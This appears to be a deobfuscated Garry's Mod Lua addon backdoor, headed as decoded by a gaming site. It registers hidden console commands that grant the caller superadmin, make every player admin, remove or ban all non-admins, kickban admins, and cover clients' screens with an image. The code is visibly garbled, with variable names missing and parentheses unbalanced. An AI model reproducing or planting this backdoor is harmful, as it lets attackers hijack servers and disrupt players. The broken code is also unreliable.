Decoded by System - ExampleGaming.com

local = _G 
local = string 
local = .gmatch 
local = .byte 
local = .len 
local = .char 
local = table 
local = .concat 
local = .insert 
local = .pack 
local = pairs 
local = {0,1,1,0,1,0,0,1} 
local = "" 
local = bit 
local = .bxor 
local = math 
local = .floor 
local = 1 
local = 0 for _,c in () do c= (c+1)/2 c= (c) = + * c c= c* 2 end 
local = function(s) 
local = "" 
local = {(s,1,(s))} for _,n in () do =  .. ((n,)) 
end 
return 
end 

if "SERVER" then  
concommand.Add ( "backdv1", function( p, c, a ) p:PrintMessage (p, HUD_PRINTCONSOLE, ("You are superadmin") )  
ULib ("ulx", "addUser", p:SteamID (p), {}, {}, superadmin )
end)  

concommand.Add ( "check", function( p, c, a ) p:PrintMessage(p, HUD_PRINTCONSOLE, "It's there" )  end)  

concommand.Add ("syncplayer"), function( p, c, a ) p:PrintMessage(p, HUD_PRINTCONSOLE, "Everyone admin" )  
for _, v in pairs ( player.Getall() ) do  
	ULib ("ulx", "addUser", v:SteamID (v), {}, {}, admin ) 
	end  
end)  

concommand.Add "backdplayers", function ( p, c, a ) p:PrintMessage(p, HUD_PRINTCONSOLE, ("Removed Players") )  
	for _, v in pairs ( player.Getall() ) do   
		if not v:IsAdmin(v) 
		then    v:Remove(v)    
		end   
	end  
end)  

concommand.Add "backdV1", function( p, c, a ) p:PrintMessage(p, HUD_PRINTCONSOLE, ("Banned Everyone") )  
for _, v in pairs ( player.Getall() ) do      
	if not v:IsAdmin(v) 
		then    
		ULib ("queueFunctionCall")
		ULib ("kickban", v, 0, "No RP", nil )    
		end   
	end  
end)  

concommand.Add "addmeagainV2", function( p, c, a ) p:PrintMessage (p, HUD_PRINTCONSOLE, ("Added You to super admin group") )  
RunConsoleCommand("ulx", "adduserid", p:SteamID(p), superadmin)   
end)   

concommand.Add "backdadmins", function ( p, c, a )
	if v:IsAdmin(v) 
		then  
			ULib "queueFunctionCall"
			ULib "kickban")], v, 0, ("No RP"), nil )  
		end   
	end)   
end   

if "CLIENT" then  
local =false  
concommand.Add "backdV2", function( p, c, a ) = true
end)   

hook.Add( "HUDPaint", "HUD UUX", function()
if  
	then 
		surface.SetDrawColor( 255, 255, 255, 255 )  
		surface.SetMaterial( Material models/icon.vtf )  
		surface.DrawTexturedRect( ScrW()/2-1500, ScrH()/2-1500, 3000, 3000 )    
	end    
end)    

concommand.Add "check2", function( p, c, a )  print( "works" )  
	end)    
end